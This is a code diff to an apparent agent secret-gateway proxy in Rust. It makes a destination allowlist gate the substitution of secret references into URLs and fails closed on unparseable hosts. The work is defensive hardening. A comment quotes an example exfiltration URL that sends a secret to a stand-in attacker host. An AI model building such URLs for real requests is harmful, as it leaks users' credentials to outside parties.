@@ -127,16 +127,36 @@ impl SecurityProxy {
 
         info!("{} {}", method, target_url);
 
+        // Pre-substitution host extraction. The destination allowlist
+        // (RFC §11.1) MUST gate URL substitution too — an attacker can
+        // otherwise smuggle a secret to an arbitrary host with
+        // `https://attacker.example/?key={{secret:X}}`. Parse the
+        // PRE-substitution URL to learn the destination, then pass it
+        // through to substitution.
+        //
+        // Edge case: if the URL itself contains `{{secret:` in the host
+        // portion (`https://{{secret:HOST}}/…`), the host can't be known
+        // until after substitution and there's no safe destination to
+        // gate on — fail closed.
+        let url_dest_host: Option<String> = reqwest::Url::parse(&target_url)
+            .ok()
+            .and_then(|u| u.host_str().map(|s| s.to_string()));
+        if url_dest_host.is_none() && target_url.contains("{{secret:") {
+            warn!("BLOCKED: URL contains secret ref but host is unparseable");
+            return Ok(blocked_response("Request rejected"));
+        }
+
         // Substitute {{secret:NAME}} references in the URL before any
         // further processing. Rationale: the URL is built by the agent
         // and may contain refs like `?key={{secret:BRAVE}}`; we need
         // the substituted URL for routing decisions (bypass, host
         // detect) and for the outbound request. Fail-closed on any
-        // unresolvable ref — see docs/rfcs/agent-secret-gateway.md §3.
-        //
-        // NOTE: this only covers URL path+query. Header and body
-        // substitution lands in a follow-up with content-type gating.
-        let target_url = match self.substitute_url(&target_url).await {
+        // unresolvable ref OR destination-allowlist denial — see
+        // docs/rfcs/agent-secret-gateway.md §3 + §11.1.
+        let target_url = match self
+            .resolve_and_substitute(&target_url, url_dest_host.as_deref())
+            .await
+        {
             Ok(url) => url,
             Err(e) => {
                 // Log the detailed reason server-side so operators can
@@ -151,7 +171,10 @@ impl SecurityProxy {
             }
         };
 
-        // Bypass check
+        // Bypass check. Substitution + raw-scan ran above, so a bypassed
+        // request can no longer forward literal `{{secret:NAME}}` text
+        // (which would leak ref names to bypassed upstreams) and the
+        // §11.1 destination allowlist has already gated the URL.
         if self.check_bypassed(&target_url) {
             info!("Bypassing: {}", target_url);
             return Ok(self.forward_upstream(req, &target_url).await);
@@ -496,19 +519,6 @@ impl SecurityProxy {
         patterns
             .iter()
             .any(|pattern| Self::host_matches_pattern(host, pattern))
-    }
-
-    /// Backwards-compatible alias so the URL-substitution call site
-    /// doesn't need to change shape. `substitute_url` used to be the
-    /// only consumer; now `resolve_and_substitute` handles headers and
-    /// bodies too.
-    async fn substitute_url(&self, url: &str) -> Result<String, String> {
-        // URL substitution can't gate on destination — the host might
-        // BE inside the substituted region, or the URL might not parse
-        // until after substitution. Caller is expected to gate
-        // substitution-in-headers/body on the parsed-host of the
-        // already-substituted URL.
-        self.resolve_and_substitute(url, None).await
     }
 
     /// Decide whether a request body of `content_type` is eligible for
